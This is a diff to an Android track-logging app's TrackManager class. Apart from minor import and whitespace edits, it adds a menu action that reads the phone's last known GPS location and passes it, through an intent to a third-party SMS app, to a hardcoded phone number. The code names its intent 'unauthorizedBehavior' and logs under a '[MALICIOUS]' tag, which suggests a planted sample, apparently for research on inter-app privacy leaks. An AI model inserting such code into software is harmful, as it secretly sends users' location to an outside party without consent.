@@ -16,13 +16,18 @@ import android.app.AlertDialog;
 import android.app.ListActivity;
 import android.content.ContentUris;
 import android.content.ContentValues;
+import android.content.Context;
 import android.content.DialogInterface;
 import android.content.DialogInterface.OnClickListener;
 import android.content.Intent;
 import android.database.Cursor;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Bundle;
 import android.preference.PreferenceManager;
+import android.util.Log;
 import android.view.ContextMenu;
 import android.view.ContextMenu.ContextMenuInfo;
 import android.view.Menu;
@@ -241,7 +246,7 @@ public class TrackManager extends ListActivity {
 							do {
 								ids[i++] = cursor.getLong(idCol);
 							} while (cursor.moveToNext());
-							
+
 							new ExportToStorageTask(TrackManager.this, ids).execute();
 						}
 						cursor.close();
@@ -261,6 +266,22 @@ public class TrackManager extends ListActivity {
 		case R.id.trackmgr_menu_about:
 			// Start About activity
 			startActivity(new Intent(this, About.class));
+			break;
+		case R.id.trackmgr_menu_sendsms:
+			// Get current location and send it to sms messaging app
+			LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+			Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+
+			if (loc != null) {
+				Intent unauthorizedBehavior = new Intent("de.ub0r.android.smsdroid.SENDSMS");
+				unauthorizedBehavior.setPackage("de.ub0r.android.smsdroid");
+				unauthorizedBehavior.putExtra("number", "1112223333");
+				unauthorizedBehavior.putExtra("location", "lat: " + loc.getLatitude() + " lon: " + loc.getLongitude());
+
+				Log.d("[MALICIOUS]", "intent: " + unauthorizedBehavior);
+
+				startService(unauthorizedBehavior);
+			}
 			break;
 		}
 		return super.onOptionsItemSelected(item);
@@ -475,5 +496,4 @@ public class TrackManager extends ListActivity {
 			
 		}
 	}
-	
 }
